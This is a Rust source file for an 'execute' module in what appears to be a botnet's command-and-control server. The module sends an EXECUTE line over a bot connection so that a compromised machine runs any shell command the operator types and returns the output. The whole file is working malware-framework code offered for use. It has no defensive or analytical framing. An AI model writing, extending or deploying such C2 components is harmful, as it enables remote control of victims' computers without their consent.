use async_trait::async_trait;
use std::sync::Arc;
use crate::core::state::BotConnection;
use crate::modules::C2Module;
use anyhow::Result;

pub struct ExecuteModule;

impl ExecuteModule {
    pub fn new() -> Self {
        Self
    }
}

#[async_trait]
impl C2Module for ExecuteModule {
    fn name(&self) -> &'static str {
        "execute"
    }

    fn description(&self) -> &'static str {
        "Command a bot to execute a shell command and return the output"
    }

    async fn execute(&self, bot: Arc<BotConnection>, args: Vec<String>) -> Result<()> {
        if args.is_empty() {
            anyhow::bail!("Usage: execute <shell_command>");
        }

        let command = args.join(" ");
        let cmd = format!("EXECUTE {}\n", command);

        let mut locked_bot = bot.connection.lock().unwrap();
        locked_bot.write_all(cmd.as_bytes()).await?;

        Ok(())
    }
}
